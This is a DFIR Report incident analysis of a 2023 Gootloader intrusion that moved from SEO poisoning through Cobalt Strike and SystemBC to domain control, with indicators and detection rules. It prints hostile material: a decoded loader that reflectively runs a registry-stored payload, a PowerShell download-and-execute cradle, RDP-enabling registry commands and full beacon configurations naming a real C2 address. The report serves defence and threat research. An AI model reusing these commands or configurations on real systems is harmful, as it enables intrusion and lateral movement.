---
title: "SEO Poisoning to Domain Control: The Gootloader Saga Continues - The DFIR Report"
source_url: "https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/"
published: "2024-02-26T00:39:52+00:00"
author: "editor"
archived_at: "2026-08-25"
source_html: "2024-02-26_GootLoader-to-Domain-Control.html"
---

# SEO Poisoning to Domain Control: The Gootloader Saga Continues - The DFIR Report
## Key Takeaways

- In February 2023, we detected an intrusion that was initiated by a user downloading and executing a file from a SEO-poisoned search result, leading to a Gootloader infection.

- Around nine hours after the initial infection, the Gootloader malware facilitated the deployment of a Cobalt Strike beacon payload directly into the host’s registry, and then executed it in memory.

- The threat actor deployed SystemBC to tunnel RDP access into the network, which aided in compromising domain controllers, backup servers, and other key servers.

- The threat actor conducted an interactive review of sensitive and confidential files using RDP; however, we have been unable to confirm whether any data was actually exfiltrated.

More information about Gootloader can be found in the following reports: The DFIR Report , GootloaderSites , Mandiant , Red Canary , & Kroll .

An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon .

Submit your feedback on this report for a chance to win free swag!

## The DFIR Report Services

We provide a range of services including Private Threat Briefs, which includes 25+ private reports yearly. These reports follow a format similar to our public reports but are more concise in nature and are published within weeks of the intrusion.

Another service we provide is our Threat Feed, specializing in tracking Command and Control frameworks such as Cobalt Strike, Metasploit, Sliver, and more.

Our comprehensive All Intel service includes the Private Threat Briefs and Threat Feed, with additional insights such as private events, long-term infrastructure tracking, clustering of intrusion data, Cobalt Strike configurations, C2 domains, and more.

We also offer a Private Ruleset which consists of exclusively curated rules using insights derived from Private Threat Briefs and other internal cases. This ruleset currently encompasses 100+ Sigma rules, created from the knowledge of 40+ cases. Each rule is mapped to ATT&CK and accompanied by a test example.

We invite you to reach out for a personalized demo of our services via our Contact Us page.

## Table of Contents:

- Case Summary

- Analysts

- Initial Access

- Execution

- Persistence

- Privilege Escalation

- Defense Evasion

- Credential Access

- Discovery

- Lateral Movement

- Collection

- Command and Control

- Timeline

- Diamond Model

- Indicators

- Detections

- MITRE ATT&CK

## Case Summary

The intrusion started in February 2023, when a user conducted a search for “Implied Employment Agreement”. The people behind Gootloader frequently exploit terms related to contracts and agreements for search engine-optimization (SEO) poisoning. In this instance, the user encountered a SEO poisoned result and clicked on it. This action directed them to a compromised website that mimicked a user forum. On this webpage, a deceptive link enticed the user to download what was supposed to be an employment agreement.

Upon opening the received zip file, the user saw a JavaScript file bearing a name similar to their initial search term. Clicking on this file triggered the Gootloader malware’s execution process. This led to the creation of a new JavaScript file within the user’s AppData folder. To ensure its continuous operation, Gootloader established a scheduled task to run this newly created file, incorporating a logon trigger for persistence. The sequence ends with the execution of an obfuscated PowerShell script, which calls another PowerShell script.

This script performs some basic discovery of information about the host using built-in PowerShell Cmdlets and WMI queries. The script then reaches out to a rotating list of remote endpoints. Around nine hours after the initial execution, one of the remote endpoints responded to the Gootloader malware, providing a download that was written to two registry keys. Those registry keys contained an obfuscated launcher for Gootloader and a Cobalt Strike beacon, which was loaded directly into memory.

Next, an instance of process injection into dllhost was detected, accompanied by network connections to several remote hosts checking for LDAP and SMB. Additionally, LDAP network traffic directed to a domain controller was observed, indicating discovery operations targeting various groups, including Domain Users, Administrators, RDP Users, and Domain Administrators.

Approximately ten minutes after these activities, the threat actor initiated lateral movement within the network. This involved creating a remote service to disable Windows Defender’s Real-Time Monitoring. Subsequently, they transferred a Cobalt Strike beacon executable over SMB and executed it as a service. Following this, additional process injections and access to the LSASS memory, were observed on the compromised hosts.

The threat actor continued trying this method to move to various workstations and domain controllers. However, on the domain controllers, Windows Defender remained operational and successfully thwarted the attempts to launch the beacons. Despite these setbacks, the attacker continued their efforts from a compromised workstation, utilizing PowerView to conduct additional discovery tasks.

To breach the domain controller, the threat actor adjusted their strategy. They introduced a new PowerShell script onto a workstation and executed it, which was a PowerShell implementation of SystemBC. This script initiated communication with a command and control server and established persistence by creating a registry run key. Following this setup, the threat actor executed multiple commands through remote services on a domain controller to ensure RDP access was enabled. They then logged into the domain controller over RDP by routing the connection through the infected workstation using SystemBC.

Having gained access to the domain controller, the threat actor transferred a text file containing a series of commands through their RDP session, aimed at further attempts to disable Windows Defender. Despite these efforts, their attempt to deploy a PowerShell beacon seemed to be unsuccessful. Not deterred, they proceeded to install Advanced IP Scanner on the domain controller and initiated a network scan. While that was running, they explored a remote file share, during which they accessed a document containing password-related information.

The threat actor next turned their attention to a backup server, utilizing Windows Remote Management (WinRM) to execute multiple commands, ensuring that RDP access to the server was enabled and open. After ensuring RDP was available, they connected to the server via RDP and proceeded to review the backup configurations for the environment. During this time, they also deployed the SystemBC PowerShell script on the server. After this activity, there was a noticeable lull in the threat actor’s actions, with no significant activities recorded for the next five hours. Upon returning, the threat actor resumed accessing hosts over RDP.

The threat actor resumed their search for sensitive information by looking through file shares for documents pertaining to passwords, while operating from the backup server. Additionally, they executed Advanced IP Scanner again, this time from the backup server. Throughout their RDP session, they interactively viewed data, yet no direct signs of data exfiltration were observed during this phase of activity. After this, the threat actor’s presence on the network ceased, and they were not detected again prior to being evicted from the network.

Submit your feedback on this report for a chance to win free swag!

## Analysts

Analysis and reporting completed by @_pete_0 , @malforsec & @r3nzsec

## Initial Access

The initial access was achieved by the user navigating to a SEO-poisoned website via Google search. Once opened the site masquerades as a forum and with a download link to an ‘Implied Employment Agreement’ document.

In our previous analysis of Gootloader, detailed in our report, “ SEO Poisoning: A Gootloader Story ,” we revisit the same initial access technique employed by threat actors. For a better understanding, we’ve included a video in our previous report that visually demonstrates the user’s journey from SEO poisoning to encountering Gootloader malware.

The ‘Implied Employment Agreement’ turned out to be a zip archive containing the GootLoader multistage loader. We can see from the below that the zip was downloaded from a website on the internet (ZoneId=3).

Below depicts the process of the start of the Gootloader infection:

## Execution

Gootloader employs several executions across the whole infection chain.

The JavaScript file was executed after the user double-clicked on it within the opened zip archive.

Execution of the Javascript file drops another Javascript file named “Frontline Management.js”. This dropped Javascript is heavily obfuscated.

In addition to the file, a new scheduled task named ‘InfrSiRfucture Technologies’ was created. This task was then invoked to run the new Javascript file. The infection chain continues with a PowerShell script. The execution chain here is Svchost.exe(Scheduled Task) ➝ Wscript.exe ➝ Cscript.exe ➝ Powershell.exe

The PowerShell script included URLs to ten remote servers:

Not all the included remote servers were weaponized at the time of execution, so some servers answered with HTTP 405 “Method Not Allowed”.

For the server that was weaponized, however, there is a different response. For this intrusion, that was 46.28.105[.]94 with the URL “hxxp:blog[.]lilianpraskova[.]cz/xmlrpc[.]php”. The server then started answering with the HTTP status code 200 “OK” and delivering the final stage in the Gootloader infection.

The final download contained three different components. Gootloader stage1(prameter $cXqt) which was an obfuscated dll, Gootloader stage2(parameter $IbaY) which ended up as an exe file when deobfuscated. Finally, a script wrote stage1 and stage2 into the registry before deobfuscating stage1 and loading that into memory. Stage1 took care of the deobfuscation of stage2, the final payload for Gootloader, and loaded what we later will see is a Cobalt Strike Beacon.

The encoded PowerShell command that ran is beautified and decoded below.

Here’s the decoded value:
609265940; sleep -s (20); 60213434; $sxd="hkcu:\software\microsoft\Personalization\geRBAdXTDCkN"; $tGSWK=gp -path $sxd; for ($tGSWKgjA=0; $tGSWKgjA -le 705; $tGSWKgjA++){Try{$OHhnP+=$tGSWK.$tGSWKgjA}Catch{}}; $tGSWKgjA=0; while($true){$tGSWKgjA++; $ko=[math]::("sqrt")($tGSWKgjA); if($ko -eq 1000){break}}$CVaW=$OHhnP.replace("#",$ko); $lSfdm=[byte[]]::("new")($CVaW.Length/2); for($tGSWKgjA=0; $tGSWKgjA -lt $CVaW.Length; $tGSWKgjA+=2){$lSfdm[$tGSWKgjA/2]=[convert]::("ToByte")($CVaW.Substring($tGSWKgjA,2),(2*8))}[reflection.assembly]::("Load")($lSfdm); [Open]::("Test")(); 809902482;
Decoding the JavaScript stager payload manually could be time-consuming, so we used this fantastic script made by Mandiant. This is a collection of scripts used to deobfuscate Gootloader malware samples. We used the GootLoaderAutoJSDecode.py Python script that automatically decodes .js files using static analysis.

## Persistence

Gootloader

A scheduled task was created during the initial Gootloader execution. This task was run on demand to execute the next stage in the Gootloader malware chain, and setup a Logon Trigger to maintain persistence on the beachhead.

SystemBC

Later in the intrusion the threat actor deployed a SystemBC PowerShell script. They setup persistence for this script by using an autorun key named ‘socks_powershell’

## Privilege Escalation

The use of the Cobalt Strike ‘getsystem’ command was evident, with cmd being spawned from the beacon (DLLHOST) to elevate to a ‘SYSTEM’ context.

Details of the technique are documented here: https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem

Throughout the intrusion, new logon sessions were initiated using tokens created from harvested credentials. Initially, a sacrificial process, dllhost.exe, was launched from the PowerShell payload using the credentials of the compromised beachhead account.

Using a harvested credential, a new logon session was created. This was logged under Windows eventID 4624, showing the initial Logon ID, and followed the new Logon ID using the target user account.

The newly created logon session (Logon ID) was assigned special privileges (elevated) as detailed in eventID 4672.

Resulting in the CMD with the new logon session with elevated privileges

The threat actor targeted several accounts using the same technique, these were:

The threat actor pivoted across compromised accounts and across several endpoints with relative ease.

Multiple detection opportunities exist, including correlating atypical logons to high-privilege accounts from unexpected accounts or workstations, and the assignment of special privileges to a logon ID by standard users. The use of ‘Logon type 9’ alongside an authentication type of ‘seclogo’ strongly indicates credential use, akin to the ‘runas’ command’s /netonly method, as used by Cobalt Strike’s ‘pass the hash’ technique. ( https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials ).

## Defense Evasion

On the beachhead host, to avoid dropping files to disk, several registry keys were created to store the payloads under:
HCKU\Software\Microsoft\Personalization

Each key has an associated payload (stage 1 and 2). These keys stored the data for the Cobalt Strike beacon executed on the beachhead.

geRBAdXTDCkN

cbkSBtbjQBNFy

Execution of the payload to run the Cobalt Strike beacon can be observed by base64 encoded PowerShell commands

During the intrusion we observed activity related to Windows Defender tampering. This command was executed remotely on the hosts using Cobalt Strike modules such as psexec_psh. Scheduled scanning tasks were deleted, and a service was created to disable real-time monitoring.

Scheduled task commands

#### Remote Desktop

Restricted Admin Mode was enabled by modifying the DisableRestrictedAdmin key to 0

Enabling Restricted Admin Mode allows the attacker to use collected hashes to login instead of a password. An explanation can be found here [ https://github.com/GhostPack/RestrictedAdmin ]. The same technique was observed by SVR and various other threat actors.

The same technique was also observed in a previous Gootloader case as well as two other public cases .

The second registry modification allowed RDP connections by changing the ‘DenyTSConnections’ setting.

Windows Firewall

On the domain controller, ‘Netsh’ was used to enable the remote desktop firewall profile

followed by the remote admin firewall profile

Process Injection

We observed process injection activity, with PowerShell and dllhost being utilized to load Cobalt Strike beacons into the memory on the beachhead host.

This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.

During the intrusion, we observed multiple named pipes utilized by the threat actor’s Cobalt Strike injected beacons via PowerShell and dllhost:

PipeName: \4fcc39
PipeName: \netsvc\1324

PipeName: \4fcc39
PipeName: \netsvc\415

## Credential Access

Across the compromised endpoints where a Cobalt Strike beacon was deployed, the LSASS process was accessed to retrieve in memory credentials.

Suspicious CallTrace with ‘UNKNOWN’ indicates injected code, whilst the Granted Access 0x1010 is a standard behavior from credential stealing tools such as mimikatz. The code 0x1010 can be broken down to the below access rights:

- 0x00000010 = VMRead

- 0x00001000 = QueryLimitedInfo

The operator spent some time accessing and viewing files. File that were of the most interest were those that could indicate credentials storage. In this intrusion ‘Notepad’ was used to view a file within a Passwords file share location.

## Discovery

Gootloader

Before hands on keyboard activity, Gootloader ran a number of PowerShell Cmdlets to collect basic host information.

The first section collected environmental data from the host using env:

Next the host operating system using Get-WmiObject:

Followed by running processes with a filter for maintitlewindow using Get-Process.

No filter:

With filter:

And a disk space check using Get-PsDrive:

RDP Port Discovery

Advanced IP Scanner ( https://www.advanced-ip-scanner.com/ ) was executed from a compromised account and then used to look for systems with RDP (3389) open.

LDAP

The DLLHost process (Cobalt Strike beacon) undertook several LDAP (Lightweight Directory Access Protocol) queries using port 389 and 3268.

Shares Enumeration

Scanning all the network endpoints for the presence of shared folders was undertaken. This is a common technique we’ve observed in other similar cases to discover and collect information of interest, i.e., credentials and confidential information.

Ping

The DLLHost (Cobalt Strike beacon) conducted several ping sweeps across endpoints using the ‘ping’ command:

The use of the ping command had several unusual indicators. The command was executed from a SYSTEM account, and a conhost process was created with no attached console session [ https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-wtsgetactiveconsolesessionid#return-value ]

Multiple executions of ‘ping’ using these indicators:

AD Groups

The threat actor enumerated the “Remote Management Users”, “Remote Desktop Users”, “Local Administrators” and “Distributed COM Users” groups.

PowerSploit

PowerView Cmdlets as part of PowerSploit were observed being used to discover the domain configuration. Observed Cmdlets included Get-DomainFileServer and Get-DomainSearcher. This was passed as a base64 encoded value, from a user context of SYSTEM. The Base64 value SQB is a common indicator of the IEX keyword, often used for downloading of files.

The command:

Decoded as:
IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:12210/'); Get-DomainFileServer
The use of a loop back IP address [127.0.0.1] indicated that the script was delivered through its own implant [dllhost]. Details of the command use here .

Invocation of Get-DomainSearcher function as a part of the Get-DomainFileServer execution:

## Lateral Movement

Cobalt Strike beacons were deployed across several endpoints using remote service creation. Services were either created based on Powershell base64 encoded payloads or as a dropper executable.

Cobalt Strike beacon PowerShell payloads have recognizable indicators, including random service name, use of COMPSPEC, and PowerShell parameters. The Base64 encoding starting with JAB is a common indicator of variables being used.

Compiled Cobalt Strike beacons were dropped onto Domain Controllers

This particular beacon was detected by the host AV [Windows Defender eventID 1117] and removed.

Cobalt Strike beacons distributed with SMB admin shares

The diagram below shows the distribution of Cobalt Strike beacons to hosts in the environment over SMB admin shares.

WMI used to start remote process

In this intrusion, the “reg add” command was executed remotely through WMI to attempt to permit RDP connections by changing the “DenyTSConnections” key to false (0), as shown with the network traffic capture below.
reg add "HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server" /f /v fDenyTSConnections /t REG_DWORD /d 0

The threat actor again executed a command to modify the registry key to enable Restricted Admin mode remotely via WMI. This activity was captured via Windows eventID 4688.

Remote Desktop Protocol

RDP was used to move laterally between several hosts. The diagram below shows the RDP connections made by the threat actor.

Windows eventlog for RDP “RemoteDesktopServices-RdpCoreTS/Operational” eventID 131 shows RDP activity with details like client IP and source port.

Remote Service creation with MSRPC

The threat actor utilized RPC to create services remotely. Using MSRPC Service Control Manager(SCM) is a known Cobalt Strike feature to execute code on remote hosts. Here the CreateWowService call is used to run PowerShell command to disable Windows Defender Real Time Monitoring. Adding the password or NTLM hash in wireshark will decrypt the traffic.

Hands On Keyboard

Using a compromised account, the threat actor was observed moving payloads between hosts using Notepad. The file they dropped the content into was aptly named ‘payload.txt’.

The file payload.txt was captured on network share before the threat actor dropped the content into a text file with Notepad. The data contained both an encoded PowerShell command and several commands to disable functionality in windows defender.

We can see the threat actor then copied the data from Sysmon eventID 24, which also shows the threat actor hostname as DESKTOP-GRALDC5.

## Collection

Besides password related documents mentioned in credential access other sensitive files were accessed using WordPad. Some files of interest were legal-related files and folders such as Contracts.

## Command and Control

Cobalt Strike

The Cobalt Strike server used for this intrusion has been tracked in the DFIR Report threat intelligence feed before the incident occured.
91.215.85.143:443
JA3: 72a589da586844d7f0818ce684948eea
JA3S: f176ba63b4d68e576b5ba345bec2c7b7
CS Stager

During the intrusion, we also observed the malicious PowerShell execution that contains base64 strings from the domain controller.

After decoding the base64 strings using CyberChef, the output generated looks cleaner. However, we also noticed the second layer of the obfuscation on the output below.

After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35, allowing for the next step of decoding the payload based on the output below.

After decoding the second layer of obfuscation using the XOR key of 35, we have the next layer of base64 strings. We can use the XOR key 35 to decode this again. We can use the below CyberChef recipe as our next step.
Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') From_Base64('A-Za-z0-9+/=',true) Gunzip() Label('Decode') Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') Conditional_Jump('',false,'',10) From_Base64('A-Za-z0-9+/=',true) XOR({'option':'Decimal','string':'35'},'Standard',false)

The data can be saved and parsed using the 1768.py tool from Didier Stevens that reveals the Cobalt Strike stager configuration, including the C2 IP (91.215.85[.]143) and the license-ID (watermark) (206546002), which is a well-known watermark used in multiple attacks based on our previous published reports.

The beachhead host using a Cobalt Strike beacon, injected into PowerShell and DLLHost processes; these served as the main ingress and egress command and control channel to 91.215.85[.]143:443

CS HTTP Beacon

The threat actor used Cobalt Strike HTTP Beacons for command and control communication. Three separate hosts were infected with a Cobalt Strike HTTP beacon communicating to IPv4 91.215.85[.]143:443.

Cobalt Strike HTTP Beacon configuration:
{ "beacontype": [ "HTTPS" ], "sleeptime": 22000, "jitter": 37, "maxgetsize": 13986556, "spawnto": "WzJAyjDIW7WfbjhHiN8wmQ==", "license_id": 206546002, "cfg_caution": false, "kill_date": null, "server": { "hostname": "91.215.85.143", "port": 443, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCN5UAJbAA83lOuZlkNoqHDAdV1F7OJnqUiF3kD6mwuXzJzVpu9+f4l/QIUotuiQA+vvxdM3q/XGu77WogAe90LRUknEdoD6YnU32G/ts9dbSwG6HySt7cLn5B3FsomLWjBbssH9e31TihCUvZbK6PRzmLW4SBgZigBWLXZgu7+SwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": "", "useragent_header": null, "http-get": { "uri": "/jquery-3.3.1.min.js", "verb": "GET", "client": { "headers": null, "metadata": null }, "server": { "output": [ "print", "append 1522 characters", "prepend 84 characters", "prepend 3931 characters", "base64url", "mask" ] } }, "http-post": { "uri": "/jquery-3.3.2.min.js", "verb": "POST", "client": { "headers": null, "id": null, "output": null } }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": "Use IE settings" }, "http_post_chunk": 0, "uses_cookies": true, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\dllhost.exe", "spawnto_x64": "%windir%\\sysnative\\dllhost.exe" }, "process-inject": { "allocator": "NtMapViewOfSection", "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 17500, "startrwx": false, "stub": "yl5rgAigihmtjA5iEHURzg==", "transform-x86": [ "prepend '\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": null, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": null, "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } }
Cobalt Strike SMB Beacon

The threat actor also used Cobalt Strike SMB beacons to chain beacons together for lateral movement. We observed four hosts where Cobalt Strike SMB beacons were used.

Cobalt Strike SMB beacon configuration:
{ "beacontype": [ "SMB" ], "sleeptime": 10000, "jitter": 0, "maxgetsize": 10485760, "spawnto": "WzJAyjDIW7WfbjhHiN8wmQ==", "license_id": 206546002, "cfg_caution": false, "kill_date": null, "server": { "hostname": "", "port": 4444, "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCN5UAJbAA83lOuZlkNoqHDAdV1F7OJnqUiF3kD6mwuXzJzVpu9+f4l/QIUotuiQA+vvxdM3q/XGu77WogAe90LRUknEdoD6YnU32G/ts9dbSwG6HySt7cLn5B3FsomLWjBbssH9e31TihCUvZbK6PRzmLW4SBgZigBWLXZgu7+SwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" }, "host_header": null, "useragent_header": "", "http-get": { "uri": null, "verb": null, "client": { "headers": [], "metadata": null }, "server": { "output": [] } }, "http-post": { "uri": "", "verb": null, "client": { "headers": [], "id": null, "output": null } }, "tcp_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "crypto_scheme": 0, "proxy": { "type": null, "username": null, "password": null, "behavior": null }, "http_post_chunk": null, "uses_cookies": null, "post-ex": { "spawnto_x86": "%windir%\\syswow64\\dllhost.exe", "spawnto_x64": "%windir%\\sysnative\\dllhost.exe" }, "process-inject": { "allocator": "NtMapViewOfSection", "execute": [ "CreateThread 'ntdll!RtlUserThreadStart'", "CreateThread", "NtQueueApcThread-s", "CreateRemoteThread", "RtlCreateUserThread" ], "min_alloc": 17500, "startrwx": false, "stub": "yl5rgAigihmtjA5iEHURzg==", "transform-x86": [ "prepend '\\x90\\x90'" ], "transform-x64": [ "prepend '\\x90\\x90'" ], "userwx": false }, "dns-beacon": { "dns_idle": null, "dns_sleep": null, "maxdns": 0, "beacon": null, "get_A": null, "get_AAAA": null, "get_TXT": null, "put_metadata": null, "put_output": null }, "pipename": "\\\\.\\pipe\\mojo.5688.8052.1838949397870888770b", "smb_frame_header": "AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", "stage": { "cleanup": true }, "ssh": { "hostname": null, "port": null, "username": null, "password": null, "privatekey": null } }
SystemBC

During the intrusion a PowerShell script named ‘s5.ps1’ was dropped to a users ‘AppData\Roaming’ folder.

s5.ps1 turned out to be a PowerShell version of SystemBC as described by Proofpoint . This PowerShell version has been appearing more frequently over the past few years [ 1 , 2 , 3 ].

Having a PCAP of the traffic, we could decrypt it and see that inside, it was running SOCKS v5 traffic.

The first 50 bytes of the first data packet are the encryption key starting with 0x00 and ending with 0x3a:

Using that key to decrypt the first answer packet shows that this is SOCKS v5 traffic and it also reveals the domain:

x05 -> Version 5
x01 -> Command Code 1
x00 -> Reserved
x03 -> Address Type
x05 -> Length of Domain (domain name redacted)
Approximately four minutes after the script was dropped, SOCKS (SystemBC) was utilized to tunnel network connections from the external IPv4 91.92.136[.]20:4001 to the domain controller via a compromised endpoint. The endpoint was configured to execute a PowerShell script [s5.ps1] that established a SOCKS connection to the attacker-controlled infrastructure.

The process and C2 activity can be illustrated as:

The script had the following indicators for the IPv4 and Port:

The SOCKS tunnel provided the following connectivity from the attacker computer and allowed RDP [3389] to be traversed externally.

A side effect of utilizing a proxy (SOCKS tunnel) on the endpoint is unusual port allocations, for example, PowerShell talking to port 3389. In this case, RDP was used to tunnel to the Domain Controller via the PowerShell process, which used port 3389.

The activity did expose the attacker’s computer name via Windows eventID 4778, with the name being ‘DESKTOP-GRALDC5’. The client address referred to the proxy endpoint, an private IPv4 address.

During the intrusion we also observed a second hostname appear ‘HOME-PC.’ This was also found via RDP access related logins.

Based on the SRUM (System Resource Utility Monitor), with the SOCKS tunnel utilized, the attacker was most active from 0600 UTC to 1100 UTC on the second day of the intrusion.

During the intrusion, it was observed that two different attacker computer names were used, ‘DESKTOP-GRALDC5’ and ‘HOME-PC’.

## Timeline

## Diamond Model

Submit your feedback on this report for a chance to win free swag!

## Indicators

### Atomic
Gootloader hxxps[:]//hrclubphilippines[.]com/xmlrpc.php hxxps[:]//mediacratia[.]ru/xmlrpc.php hxxps[:]//daraltanweer[.]com/xmlrpc.php hxxps[:]//ukrainians[.]today/xmlrpc.php hxxps[:]//my-little-kitchen[.]com/xmlrpc.php hxxps[:]//montages[.]no/xmlrpc.php hxxps[:]//pocketofpreschool[.]com/xmlrpc.php hxxp[:]//blog[.]lilianpraskova[.]cz/xmlrpc.php hxxps[:]//sitmeanssit[.]com/xmlrpc.php hxxp[:]//artmodel[.]com[.]ua/xmlrpc.php Cobalt Strike 91.215.85[.]143:443 SystemBC C2 91.92.136[.]20:4001

### Computed
Implied_employment_agreement_70159.zip fb6e4f75763fad6d0e7fe85a563b0c24 7e8543f2bc09bf320510fde5e34e32065339d9d2 873dd1dcdfcbe9826b274c5880f5be81a878ee93715fbb18a654d9dba61c5dfc implied employment agreement 24230.js deb24dfaf8178fda2d070aba9134a30c ecc0b26106703e129fb1e2ec132c373870c2e7b6 f94048917ac75709452040754bb3d1a0aff919f7c2b4b42c5163c7bdb1fbf346 Frontline Management.js 4f4ee823a8c7e2511f05b3ea633c0d2c 877515fecc14ed193167e8a20c6b9a684a74564d ecc7f13c3f0f8d4775e05715810b0164c52b7bd233e4a2e4f5a37769becb0092 stage1 (geRBAdXTDCkN) md5sum payload1.dll_: 25b38e45df3cd215386077850c59be07 sha1sum payload1.dll_: a88a28c73aa42956c9f9d12585a8de63d4a00e47 sha256sum payload1.dll_: 68dd1a2da732d56b0618f8581502fcf209b1c828c97d05f239c98d55bb78b562 stage2 (cbkSBtbjQBNFy) md5sum payload2.exe_: 1b8b4f05058ac39091b99cc153ab00c0 sha1sum payload2.exe_: e0b568a3e35257cd30b0c42727c3529cef13b081 sha256sum payload2.exe_: 831955bd05186381a8f15539a41f48166873eab3feb55fb1104202e4152bd507 e544944.exe - CS beacon md5sum e544944.exe: f769cb73317421c290832777c9e14f92 sha1sum e544944.exe: f043898fc9db6985c4ad8bb84669c081cdaa8e6f e544944.exe sha256sum e544944.exe: 40c40495434bf987b04f0742c3e9201189675d87a042aa72abbd0084c3de66d8 imphash: 49145e436aa571021bb1c7b727f8b049 5d78365.exe - CS beacon md5sum 5d78365.exe: 9f9c7b2c8f245e62a08bf5f8a3eb3498 sha1sum 5d78365.exe: 3cf851eb09c934cafe9b98d4706f903dff804b0c sha256sum 5d78365.exe: aad75498679aada9ee2179a8824291e3b4781d5683c2fa5b3ec92267ce4a4a33 imphash: 49145e436aa571021bb1c7b727f8b049 dae50de.exe - CS beacon md5sum dae50de.exe: a617e6687ab5d747c530b930bb4a3209 sha1sum dae50de.exe: d53e550b54c08606e19965a9f74bbaa7063e10f1 sha256sum dae50de.exe: be3222219f029b47120390b2b1ad46ae86287e64a1f7228d6b2ffd89345a889e imphash: 49145e436aa571021bb1c7b727f8b049 a4a2ea4.exe - CS beacon md5sum a4a2ea4.exe: e9fc0203d1dea15dff56a285d0f86b62 sha1sum a4a2ea4.exe: 72076af2ce8df6f8b1121c38f3c3db043c540369 sha256sum a4a2ea4.exe: 792a95234b01c256019b16a242b9487b99e98ed8a955eaecf1e44b0141aa12f4 imphash: 49145e436aa571021bb1c7b727f8b049

## Detections

### Network
ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY PE EXE or DLL Windows file download HTTP ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET MALWARE SystemBC Powershell bot registration ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET POLICY Possible Powershell .ps1 Script Use Over SMB ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement

### Sigma

Search rules on detection.fyi or sigmasearchengine.com

DFIR Public Rules Repo :
92f0538f-ad13-4776-9366-b7351d51c4b8 : Disable Windows Defender via Service 81cfbbae-5e93-4934-84a2-e6a26f85c7bb : JavaScript Execution Using MSDOS 8.3 File Notation
DFIR Private Rules:
8537a157-5c6c-4173-9e65-943ff82c1efb : New Remote Access Configuration via netsh.exe
b17dc721-6e2d-4f2c-aaf5-4cbdcdfed6f5 : Remote Password File Access via Notepad or Wordpad
Sigma Repo :
